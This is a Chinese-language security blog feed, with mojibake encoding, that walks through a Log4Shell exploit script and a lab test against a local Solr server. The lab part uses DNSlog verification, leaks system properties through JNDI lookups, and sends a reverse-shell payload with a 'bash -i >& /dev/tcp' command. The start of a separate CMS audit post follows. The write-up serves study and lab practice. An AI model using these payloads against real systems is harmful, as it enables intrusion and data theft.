æ–¹æ³•ç”¨äºè§£æå‘½ä»¤è¡Œå‚æ•°ï¼Œå¹¶å°†è§£æåçš„å‚æ•°å€¼å­˜å‚¨åœ¨ä¸€ä¸ªåä¸º <code>args</code> çš„å˜é‡ä¸­</p><p>ä¾‹å¦‚ï¼Œåœ¨æ‰§è¡Œè„šæœ¬ååŠ çš„å‘½ä»¤è¡Œå‚æ•°<code>--listen-port 8080</code>å°±è½¬å˜ä¸ºäº†<code>args.listen_port = 8080</code>ï¼Œè¿™æ ·åœ¨åç»­</p><p>ä»£ç è°ƒç”¨ä¸åŒå‚æ•°æ—¶ï¼Œå¯ç›´æ¥è°ƒç”¨<code>arg</code>æ¥å®ç°</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">args = parser.parse_args()</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå…ˆåˆ›å»ºä¸€ä¸ªåŸºäºçº¿ç¨‹çš„ <code>TCP</code> æœåŠ¡å™¨ï¼Œå¹¶ä½¿ç”¨ <code>args.listen_host</code> å’Œ <code>args.listen_port</code> æ¥æŒ‡å®šçš„ä¸»æœºå’Œç«¯</p><p>å£å¯åŠ¨ï¼Œå¹¶ä½¿ç”¨ <code>ThreadedTCPRequestHandler</code> ç±»æ¥å¤„ç†æ¯ä¸ªè¯·æ±‚ã€ä¹Ÿå°±æ˜¯å‰é¢æåˆ°çš„ã€‘</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27; i| starting server on <span class="subst">&#123;args.listen_host&#125;</span>:<span class="subst">&#123;args.listen_port&#125;</span>&#x27;</span>)</span><br><span class="line">    server = ThreadedTCPServer((args.listen_host, args.listen_port),</span><br><span class="line">ThreadedTCPRequestHandler)</span><br></pre></td></tr></table></figure><p>è¿™é‡Œä¸»è¦æ˜¯å…ˆåˆ›å»ºä¸€ä¸ª <code>threading.Thread</code> å¯¹è±¡ï¼Œå¹¶å°†æœåŠ¡å™¨çš„ <code>serve_forever()</code> æ–¹æ³•ä½œä¸ºå…¶ç›®æ ‡ã€‚è¿™ä¸ªæ–¹æ³•</p><p>å°±æ˜¯å­—é¢æ„æ€ï¼Œå®ƒä¼šä¸€ç›´è¿è¡Œï¼Œç›´åˆ°æœåŠ¡å™¨è¢«å…³é—­ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">serv_thread = threading.Thread(target=server.serve_forever)</span><br></pre></td></tr></table></figure><p><code>daemon</code> å±æ€§æ˜¯ <code>Python</code> ä¸­çš„çº¿ç¨‹ç‰¹æœ‰å±æ€§ï¼Œå®ƒè¡¨ç¤ºè¯¥çº¿ç¨‹æ˜¯å¦ä¸ºå®ˆæŠ¤çº¿ç¨‹ï¼Œå¦‚æœä¸€ä¸ªçº¿ç¨‹æ˜¯å®ˆæŠ¤çº¿ç¨‹ï¼Œ</p><p>é‚£ä¹ˆå½“ç¨‹åºé€€å‡ºæ—¶ï¼Œå®ƒä¹Ÿä¼šè¢«ä¸­æ–­ã€‚</p><p>è€Œè¿™é‡Œçš„è¢«è®¾ç½®ä¸º<code>ture</code>ï¼Œæ‰€ä»¥è¿™æ„å‘³ç€ç¨‹åºé€€å‡ºæ—¶ï¼Œçº¿ç¨‹å°†è¢«ä¸­æ–­ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">serv_thread.daemon = <span class="literal">True</span></span><br></pre></td></tr></table></figure><p>ç„¶åå°±æ˜¯å¯åŠ¨çº¿ç¨‹ï¼Œå¹¶å»¶è¿Ÿ <code>1</code> ç§’é’Ÿï¼Œæ¥ç¡®ä¿æœåŠ¡å™¨å®Œå…¨å¯åŠ¨</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">serv_thread.start()</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27; i| server started&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">f&#x27;$&#123;&#123;jndi:ldap://<span class="subst">&#123;args.exploit_host&#125;</span>:<span class="subst">&#123;args.listen_port&#125;</span>/<span class="subst">&#123;args.leak&#125;</span>&#125;&#125;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27; i| sending exploit payload <span class="subst">&#123;payload&#125;</span> to <span class="subst">&#123;args.target&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure><p>è¿™é‡Œä½¿ç”¨ <code>try-finally</code> è¯­å¥å—å‘æœåŠ¡å™¨å‘é€<code>payload</code>:</p><p><code>$&#123;&#123;jndi:ldap://&#123;args.exploit_host&#125;:&#123;args.listen_port&#125;/&#123;args.leak&#125;&#125;&#125;</code></p><p>å¹¶æ‰“å°æœåŠ¡å™¨çš„å“åº”çŠ¶æ€ç ï¼Œä»¥åŠå“åº”çš„æ–‡æœ¬å†…å®¹</p><p>æœ€åè°ƒç”¨æœåŠ¡å™¨çš„ <code>shutdown()</code> å’Œ <code>server_close()</code> æ–¹æ³•ï¼Œä»¥å…³é—­æœåŠ¡å™¨ï¼Œå³ä½¿åœ¨å‘é€ <code>HTTP</code> è¯·æ±‚æ—¶å‘ç”Ÿå¼‚å¸¸ä¹Ÿæ˜¯å¦‚æ­¤ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    r = requests.get(args.target, headers=&#123;<span class="string">&#x27;User-Agent&#x27;</span>: payload&#125;)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27; i| response status code: <span class="subst">&#123;r.status_code&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27; i| response: <span class="subst">&#123;r.text&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27; e| failed to make request: <span class="subst">&#123;e&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">    server.shutdown()</span><br><span class="line">    server.server_close()</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå°±æ˜¯ä¸€ä¸ªå¸¸è§çš„è¯­å¥ï¼Œå¦‚æœè„šæœ¬æ˜¯ç‹¬ç«‹æ‰§è¡Œçš„ï¼Œåˆ™ç›´æ¥å°±è°ƒç”¨ <code>main()</code> å‡½æ•°ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()    </span><br></pre></td></tr></table></figure><h2 id="äº†è§£æ¼æ´æè¿°ä¸æ³¨å…¥åŸç†"><a href="#äº†è§£æ¼æ´æè¿°ä¸æ³¨å…¥åŸç†" class="headerlink" title="äº†è§£æ¼æ´æè¿°ä¸æ³¨å…¥åŸç†"></a><strong>äº†è§£æ¼æ´æè¿°ä¸æ³¨å…¥åŸç†</strong></h2><p><code>Apache Log4j 2</code> æ˜¯<code>Java</code>è¯­è¨€çš„æ—¥å¿—å¤„ç†å¥—ä»¶ï¼Œä½¿ç”¨æä¸ºå¹¿æ³›ã€‚åœ¨å…¶<code>2.0</code>åˆ°<code>2.14.1</code>ç‰ˆæœ¬ä¸­å­˜åœ¨ä¸€å¤„<code>JNDI</code>æ³¨å…¥æ¼</p><p>æ´ï¼Œæ”»å‡»è€…åœ¨å¯ä»¥æ§åˆ¶æ—¥å¿—å†…å®¹çš„æƒ…å†µä¸‹ï¼Œé€šè¿‡ä¼ å…¥ç±»ä¼¼äº</p><p><code>$&#123;jndi:ldap://evil.com/example&#125;</code>çš„<code>lookup</code>ç”¨äºè¿›è¡Œ<code>JNDI</code>æ³¨å…¥ï¼Œæ‰§è¡Œä»»æ„ä»£ç ã€‚</p><h3 id="Log4j2-Lookup"><a href="#Log4j2-Lookup" class="headerlink" title="Log4j2 Lookup"></a>Log4j2 Lookup</h3><p><code>Log4j2</code> <code>Lookup</code>æ˜¯<code>Log4j2</code>çš„ä¸€é¡¹åŠŸèƒ½ï¼Œå…è®¸æ‚¨<strong>åœ¨æ—¥å¿—æ¶ˆæ¯ä¸­ä½¿ç”¨åŠ¨æ€å€¼</strong>ï¼Œ<code>Log4j2</code>æä¾›äº†è®¸å¤šå†…ç½®çš„<code>Lookup</code>å¯¹</p><p>è±¡ï¼Œç”¨äºæŸ¥æ‰¾ä¸åŒç±»å‹çš„å€¼</p><p>ä¾‹å¦‚<code>SystemPropertiesLookup.lookup(&quot;user.home&quot;)</code>æ–¹æ³•è¿”å›äº†ç³»ç»Ÿå±æ€§<code>user.home</code>çš„å€¼ï¼Œå¹¶å°†å…¶æ’å…¥æ—¥å¿—</p><p>æ¶ˆæ¯ä¸­ã€‚</p><h3 id="JNDI"><a href="#JNDI" class="headerlink" title="JNDI"></a>JNDI</h3><p>å¼€å§‹æˆ‘ä¹Ÿçœ‹ä¸å¤ªæ‡‚<code>JNDI</code>ä»»æ„ä»£ç æ‰§è¡Œè¯­å¥æ„æ€</p><p>å…ˆäº†è§£ä¸€ä¸‹<code>JNDI</code>æ˜¯ä»€ä¹ˆä»¥åŠå…¶ç»„æˆ</p><p><code>JNDI</code>ï¼ˆ<code>Java</code>å‘½åå’Œç›®å½•æ¥å£ï¼‰ï¼Œæ˜¯<code>Java</code>æä¾›çš„ä¸€ä¸ªç›®å½•æœåŠ¡åº”ç”¨ç¨‹åºæ¥å£ï¼ˆ<code>API</code>ï¼‰</p><p>å®ƒæä¾›ä¸€ä¸ªç›®å½•ç³»ç»Ÿï¼Œå¹¶å°†æœåŠ¡åç§°ä¸å¯¹è±¡å…³è”èµ·æ¥ï¼Œä»è€Œä½¿å¾—å¼€å‘äººå‘˜åœ¨å¼€å‘è¿‡ç¨‹ä¸­å¯ä»¥ä½¿ç”¨åç§°æ¥è®¿é—®å¯¹è±¡ </p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">å…¶ä¸­å¤§è‡´æœ‰</span><br><span class="line">è¿œç¨‹æ–¹æ³•è°ƒç”¨ï¼ˆRMIï¼‰ï¼Œé€šç”¨å¯¹è±¡è¯·æ±‚ä»£ç†ä½“ç³»ç»“æ„ï¼ˆCORBAï¼‰ï¼Œè½»å‹ç›®å½•è®¿é—®åè®®ï¼ˆLDAPï¼‰æˆ–åŸŸåæœåŠ¡ï¼ˆDNSï¼‰</span><br></pre></td></tr></table></figure><p>å…¶å¤§è‡´ç»„æˆä¸º</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">String jndiName= ...;<span class="comment">//æŒ‡å®šéœ€è¦æŸ¥æ‰¾nameåç§°</span></span><br><span class="line"><span class="type">Context</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();<span class="comment">//åˆå§‹åŒ–é»˜è®¤ç¯å¢ƒ</span></span><br><span class="line"><span class="type">DataSource</span> <span class="variable">ds</span> <span class="operator">=</span> (DataSourse)context.lookup(jndiName);<span class="comment">//æŸ¥æ‰¾è¯¥nameçš„æ•°æ®</span></span><br></pre></td></tr></table></figure><p><u><strong>æ‰€ä»¥å¦‚æœèƒ½æ§åˆ¶<code>jndiName</code>ï¼Œå†åˆ©ç”¨<code>rmi</code>ä¹‹ç±»çš„åŠ è½½è¿œç¨‹ç±»æ–‡ä»¶è¿›è¡Œè°ƒç”¨ï¼Œå°±å¯èƒ½å®ç°è¿œç¨‹ä»£ç æ‰§è¡Œ</strong></u></p><h3 id="JNDIæ³¨å…¥"><a href="#JNDIæ³¨å…¥" class="headerlink" title="JNDIæ³¨å…¥"></a>JNDIæ³¨å…¥</h3><p>ç»“åˆ<code>lookup</code>å’Œ<code>jndi</code></p><p><strong>å¯¹äº<code>payload</code></strong></p><p><code>$&#123;jndi:ldap://evil.com/example&#125;</code>æ˜¯<code>Log4j2</code>ä¸­ä½¿ç”¨çš„<strong>å ä½ç¬¦</strong>è¯­æ³•ã€‚<strong>å®ƒè¡¨ç¤ºåœ¨æ—¥å¿—æ¶ˆæ¯ä¸­æ’å…¥ä¸€ä¸ªä½¿ç”¨</strong></p><p><strong><code>JNDILookup</code>å¯¹è±¡æŸ¥æ‰¾çš„å€¼</strong></p><p><code>ldap://evil.com/example</code>æ˜¯<code>JNDI</code>æŸ¥æ‰¾æ‰€ä½¿ç”¨çš„åç§°ã€‚è¿™æ„å‘³ç€<code>Log4j2</code>å°†åœ¨<code>JNDI</code>ä¸Šä¸‹æ–‡ä¸­æŸ¥æ‰¾åä¸º<code>example</code></p><p>çš„å¯¹è±¡ï¼Œè¯¥å¯¹è±¡ä½äº<code>evil.com</code>æœåŠ¡å™¨ä¸Šï¼Œå°±å¯èƒ½å®ç°è®¿é—®ä¸€äº›æ•æ„Ÿä¿¡æ¯ä»¥åŠå…¶ä»–æ¶æ„æ“ä½œçš„ç›®çš„</p><h2 id="æ¸—é€æµ‹è¯•"><a href="#æ¸—é€æµ‹è¯•" class="headerlink" title="æ¸—é€æµ‹è¯•"></a>æ¸—é€æµ‹è¯•</h2><h3 id="åˆ©ç”¨DNSlogéªŒè¯æ¼æ´"><a href="#åˆ©ç”¨DNSlogéªŒè¯æ¼æ´" class="headerlink" title="åˆ©ç”¨DNSlogéªŒè¯æ¼æ´"></a>åˆ©ç”¨DNSlogéªŒè¯æ¼æ´</h3><p>è®¿é—®<code>http://www.dnslog.cn/</code></p><p>å…ˆ<code>Get SubDomain</code>è·å–ä¸€ä¸ªå­åŸŸå</p><p><img src="/2022/12/01/CVE-Test/image-20221220145121926.png" alt="image-20221220145121926"></p><p>ä½†æ˜¯æ—¢ç„¶æ˜¯æ³¨å…¥ï¼Œé‚£è‚¯å®šæ˜¯å­˜åœ¨å‚æ•°æ³¨å…¥ç‚¹ï¼ŒæŸ¥çœ‹å®˜æ–¹<code>solr</code>æ–‡æ¡£ï¼Œå¾—åˆ°åœ¨<code>cores</code>é‡Œ</p><p><img src="/2022/12/01/CVE-Test/image-20221220145505204.png" alt="image-20221220145505204"></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/admin/</span>cores?action=</span><br></pre></td></tr></table></figure><p>å…¶ä¸­<code>action</code>å‚æ•°å¯æ§ï¼Œæœ‰å¾ˆå¤§å¯èƒ½æ˜¯æ³¨å…¥ç‚¹</p><p>äºæ˜¯æŠŠæˆ‘ä»¬çš„<code>dnslog</code>è·å–çš„å­åŸŸåæŒ‰<code>payload</code>å½¢å¼æ·»åŠ åˆ°<code>url</code>åå‚æ•°ä¸­</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">80.131</span>:<span class="number">8983</span><span class="regexp">/solr/</span>admin<span class="regexp">/cores?action=$&#123;jndi:ldap:/</span><span class="regexp">/4d5do5.dnslog.cn&#125;</span></span><br></pre></td></tr></table></figure><p>è®¿é—®æŸ¥çœ‹</p><p><code>DNSlog</code>æ”¶åˆ°äº†è®¿é—®è¯·æ±‚</p><p><img src="/2022/12/01/CVE-Test/image-20221220145131607.png" alt="image-20221220145131607"></p><p>åŒæ—¶åœ¨é¶æœºé¡µé¢ä¸‹ä¹Ÿæœ‰<code>DNSlog</code>å­åŸŸåå›æ˜¾ï¼Œè™½ç„¶æ˜¯</p><p><img src="/2022/12/01/CVE-Test/image-20221220145054026.png" alt="image-20221220145054026"></p><p>è¯´æ˜è¿™é‡Œçš„<code>$&#123;jndi:ldap://eavgk6.dnslog.cn&#125;</code>ï¼Œç¡®å®è¾¾åˆ°äº†è®¿é—®çš„ä½œç”¨</p><p>æ•…æ­¤æ¨æ–­<code>log4j2</code>æ¼æ´å­˜åœ¨</p><h3 id="ä¿¡æ¯æ³„éœ²æ¼æ´"><a href="#ä¿¡æ¯æ³„éœ²æ¼æ´" class="headerlink" title="ä¿¡æ¯æ³„éœ²æ¼æ´"></a>ä¿¡æ¯æ³„éœ²æ¼æ´</h3><p>è¿™é‡Œå¯ä»¥åˆ©ç”¨è„šæœ¬åˆ†æä¸­<code>exploitdb</code>é‡Œçš„ä¿¡æ¯æ³„éœ²è„šæœ¬å³å¯</p><p>æŒ‰ç…§è„šæœ¬åŸç†ä¹Ÿæ˜¯åˆ©ç”¨å ä½ç¬¦ï¼Œä¹Ÿå°±æ˜¯<code>payload</code>çš„å½¢å¼ï¼Œä½†æ˜¯å‚æ•°ä¸ºç³»ç»Ÿå±æ€§ï¼Œè¿™äº›å±æ€§ä¼šè‡ªåŠ¨è¿”å›å¯¹åº”çš„å€¼ï¼Œ</p><p>æœ€åè„šæœ¬é€šè¿‡å¯¹è¿”å›æ•°æ®çš„è§£æï¼Œå°±å¯ä»¥å¾—åˆ°æ•æ„Ÿæ•°æ®</p><p>å½“ç„¶ç›´æ¥é€šè¿‡è®¿é—®å¾—åˆ°æ¶ˆæ¯ä¹Ÿæ˜¯å¯ä»¥çš„</p><p>æ¯”å¦‚<code>$&#123;sys:os.version&#125;</code>ï¼Œå°±å¾—åˆ°æˆ‘ä»¬é¶æœºçš„ç³»ç»Ÿå†…æ ¸ç‰ˆæœ¬å·ä¸º<code>5.15.0-56-generic</code></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">80.131</span>:<span class="number">8983</span><span class="regexp">/solr/</span>admin<span class="regexp">/cores?action=$&#123;jndi:ldap:/</span><span class="regexp">/$&#123;sys:os.version&#125;.7b09py.dnslog.cn&#125;</span></span><br></pre></td></tr></table></figure><p><img src="/2022/12/01/CVE-Test/image-20221220220840849.png" alt="image-20221220220840849"></p><p>å¯¹äº<code>usr.name</code>ï¼Œä»¥åŠ<code>os.name</code>ç­‰ç­‰éƒ½æ˜¯å¯ä»¥å®ç°</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">80.131</span>:<span class="number">8983</span><span class="regexp">/solr/</span>admin<span class="regexp">/cores?action=$&#123;jndi:ldap:/</span><span class="regexp">/$&#123;sys:user.name&#125;.7b09py.dnslog.cn&#125;</span></span><br></pre></td></tr></table></figure><p><img src="/2022/12/01/CVE-Test/image-20221220175405653.png" alt="image-20221220175405653"></p><p>ä»¥ä¸‹å°±æ˜¯åœ¨<code>log4j2</code>å…¶ä»–å¯ç”¨ç³»ç»Ÿå±æ€§åˆ—è¡¨</p><p><img src="/2022/12/01/CVE-Test/image-20221220170944260.png" alt="image-20221220170944260"></p><h3 id="è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´"><a href="#è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´" class="headerlink" title="è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´"></a>è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´</h3><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">æ”»å‡»æœºkali <span class="built_in">ip</span>:<span class="number">192</span>.<span class="number">168</span>.<span class="number">80</span>.<span class="number">128</span></span><br><span class="line">æ”»å‡»æœºkali ç›‘å¬ç«¯å£:<span class="number">8888</span></span><br><span class="line">é¶æœºubuntu <span class="built_in">ip</span>:<span class="number">192</span>.<span class="number">168</span>.<span class="number">80</span>.<span class="number">131</span></span><br></pre></td></tr></table></figure><h4 id="JNDIExploit-1-2-SNAPSHOT-jaråˆ©ç”¨JNDIæ³¨å…¥åå¼¹shell"><a href="#JNDIExploit-1-2-SNAPSHOT-jaråˆ©ç”¨JNDIæ³¨å…¥åå¼¹shell" class="headerlink" title="JNDIExploit-1.2-SNAPSHOT.jaråˆ©ç”¨JNDIæ³¨å…¥åå¼¹shell"></a>JNDIExploit-1.2-SNAPSHOT.jaråˆ©ç”¨JNDIæ³¨å…¥åå¼¹shell</h4><p>è¯¥å·¥å…·çš„åŸç†æˆ‘å‰–æäº†ä¸€ä¸‹ï¼Œ</p><p>å…ˆå¯åŠ¨å·¥å…·</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">java</span> -jar JNDIExploit-<span class="number">1</span>.<span class="number">2</span>-SNAPSHOT.jar -i <span class="number">192.168.80.128</span></span><br></pre></td></tr></table></figure><p><img src="/2022/12/01/CVE-Test/image-20221221163132059.png" alt="image-20221221163132059"></p><p>ç®€å•æ¥è®²å°±æ˜¯åœ¨æ”»å‡»æœºã€<code>192.168.80.128</code>ã€‘çš„çš„<code>1389</code>ç«¯å£æ­å»ºèµ·äº†ä¸€ä¸ªæœåŠ¡å™¨ï¼Œå…¶ä¸­æ”¾ç½®äº†ä¸€ä¸ªæ¶æ„ç±»ï¼Œ</p><p>é€šè¿‡åˆ©ç”¨é¶æœºç½‘ç«™<code>JNDI</code>æ³¨å…¥æ¼æ´æŠŠè¿™ä¸ªæ¶æ„ç±»è¿›è¡Œè¿œç¨‹åŠ è½½ï¼Œä»è€Œæ‰§è¡Œäº†å‘½ä»¤</p><p>åˆ©ç”¨<code>JNDIExploit-1.2-SNAPSHOT.jar</code>æœ€å¥½çš„å°±æ˜¯ç®€åŒ–äº†<code>1.0</code>çš„ç¹æ‚å‚æ•°</p><p>åªéœ€è¦æ„é€ <code>payload</code></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">80.131</span>:<span class="number">8983</span><span class="regexp">/solr/</span>admin<span class="regexp">/cores?action=$&#123;jndi:ldap:/</span><span class="regexp">/192.168.80.128:1389/</span>Basic<span class="regexp">/ReverseShell/</span><span class="number">192.168</span>.<span class="number">80.128</span>/<span class="number">6666</span>&#125;</span><br></pre></td></tr></table></figure><p><code>/Basic/ReverseShell/</code>ä¸­å…¶å®å°±åŒ…å«åå¼¹<code>shell</code>çš„å‘½ä»¤</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; <span class="regexp">/dev/</span>tcp<span class="regexp">/xx.xx.xx.xx/</span>xxxx <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br><span class="line">*è¿™é‡Œçš„</span><br><span class="line"><span class="regexp">/xx.xx.xx.xx/</span>xxxx</span><br><span class="line">å°±æ˜¯å…¶åè·Ÿä¸Šçš„å‚æ•°</span><br><span class="line"><span class="regexp">/192.168.80.128/</span><span class="number">6666</span></span><br></pre></td></tr></table></figure><p>äºæ˜¯å°±æ˜¯<code>/Basic/ReverseShell/192.168.80.128/6666</code>è¢«æ¶æ„ç±»åŒ…å«</p><p>ç„¶ååœ¨æ”»å‡»æœºç›‘å¬<code>6666</code>ç«¯å£</p><p><img src="/2022/12/01/CVE-Test/image-20221221203418508.png" alt="image-20221221203418508"></p><p>æœ€åè®¿é—®<code>payload</code>ï¼Œè§¦å‘</p><p><img src="/2022/12/01/CVE-Test/image-20221221203458628.png" alt="image-20221221203458628"></p><p>æˆåŠŸåå¼¹åˆ°<code>shell</code></p><p><img src="/2022/12/01/CVE-Test/image-20221221203538282.png" alt="image-20221221203538282"></p><p>æµ‹è¯•å®Œæ¯•</p><h1 id="CVE-2022-28346"><a href="#CVE-2022-28346" class="headerlink" title="CVE-2022-28346"></a>CVE-2022-28346</h1>]]></content>
      
      
      <categories>
          
          <category> ç½‘ç»œå®‰å…¨å­¦ä¹  </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ¼æ´ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ¼æ´æµ‹è¯•</title>
      <link href="/2022/11/22/CMS-Test/"/>
      <url>/2022/11/22/CMS-Test/</url>
      
        <content type="html"><![CDATA[<p><code>è®­ç»ƒä¸€ä¸‹è‡ªå·±çš„ä»£ç å®¡è®¡èƒ½åŠ›ï¼Œäº†è§£ä¸€äº›å¼€æºæ¡†æ¶çš„æ¼æ´å½¢æˆåŸå› ï¼Œå¹¶è‡ªå·±å°è¯•å¤ç°</code></p><span id="more"></span><h1 id="æ¼«åŸCMS-v2-5-8æ¼æ´åˆ†æ"><a href="#æ¼«åŸCMS-v2-5-8æ¼æ´åˆ†æ" class="headerlink" title="æ¼«åŸCMS v2.5.8æ¼æ´åˆ†æ"></a>æ¼«åŸCMS v2.5.8æ¼æ´åˆ†æ</h1><h2 id="ç¯å¢ƒæ­å»ºphpstudy"><a href="#ç¯å¢ƒæ­å»ºphpstudy" class="headerlink" title="ç¯å¢ƒæ­å»ºphpstudy"></a>ç¯å¢ƒæ­å»º<code>phpstudy</code></h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Apache</span> <span class="number">2</span>.<span class="number">4</span>.<span class="number">43</span></span><br><span class="line"><span class="attribute">MySQL</span> <span class="number">8</span>.<span class="number">0</span>.<span class="number">12</span></span><br><span class="line"><span class="attribute">php</span> <span class="number">7</span>.<span class="number">3</span>.<span class="number">4</span></span><br></pre></td></tr></table></figure><h3 id="ç®¡ç†å‘˜é¡µé¢"><a href="#ç®¡ç†å‘˜é¡µé¢" class="headerlink" title="ç®¡ç†å‘˜é¡µé¢"></a>ç®¡ç†å‘˜é¡µé¢</h3><p><img src="/2022/11/22/CMS-Test/image-20221122144520325.png" alt="image-20221122144520325"></p><h3 id="ä¸»é¡µ"><a href="#ä¸»é¡µ" class="headerlink" title="ä¸»é¡µ"></a>ä¸»é¡µ</h3><p><img src="/2022/11/22/CMS-Test/image-20221122144602259.png" alt="image-20221122144602259"></p><h2 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h2><h3 id="å®˜æ–¹æ–‡æ¡£ä¿¡æ¯"><a href="#å®˜æ–¹æ–‡æ¡£ä¿¡æ¯" class="headerlink" title="å®˜æ–¹æ–‡æ¡£ä¿¡æ¯"></a>å®˜æ–¹æ–‡æ¡£ä¿¡æ¯</h3><p>æ•´ä½“ç›®å½•ç»“æ„</p><p>å¦‚ä¸‹ï¼ˆå¤§è‡´çŒœæµ‹æ¼æ´å‡ºç°ä½ç½®ï¼‰ï¼š</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">â”‚â”€attachment <span class="regexp">//</span>é™„ä»¶ç›®å½•</span><br><span class="line">â”‚â”€caches  <span class="regexp">//</span>ç¼“å­˜ç›®å½•</span><br><span class="line">â”‚â”€packs <span class="regexp">//</span>é™æ€æ–‡ä»¶ç›®å½•</span><br><span class="line">â”‚â”€rewrite <span class="regexp">//</span>ä¼ªé™æ€æ–‡ä»¶ç›®å½•</span><br><span class="line">â”‚â”€sys <span class="regexp">//</span>ç³»ç»Ÿæ ¸å¿ƒç›®å½•</span><br><span class="line">â”‚  â”‚â”€apps <span class="regexp">//</span>åº”ç”¨ç›®å½•</span><br><span class="line">â”‚  â”‚â”€class <span class="regexp">//</span>ç¬¬ä¸‰æ–¹åº“ç±»ç›®å½•ã€å¯èƒ½å­˜åœ¨ã€‘</span><br><span class="line">â”‚  â”‚â”€errors <span class="regexp">//</span>ç³»ç»Ÿé”™è¯¯æç¤ºç›®å½•</span><br><span class="line">â”‚  â”‚â”€libs <span class="regexp">//</span>ç³»ç»Ÿå¸¸é‡é…ç½®ç›®å½•</span><br><span class="line">â”‚  â”‚â”€system <span class="regexp">//</span>CIæ¡†æ¶ç›®å½•</span><br><span class="line">â”‚â”€template <span class="regexp">//</span>æ¨¡æ¿ç›®å½•ã€å¯èƒ½å­˜åœ¨ã€‘</span><br><span class="line">â”‚  â”‚â”€admin <span class="regexp">//</span>åå°æ¨¡æ¿</span><br><span class="line">â”‚  â”‚â”€install <span class="regexp">//</span>ç³»ç»Ÿå®‰è£…æ¨¡æ¿</span><br><span class="line">â”‚  â”‚â”€pc <span class="regexp">//</span>å‰å°PCç«¯æ¨¡ç‰ˆ</span><br><span class="line">â”‚  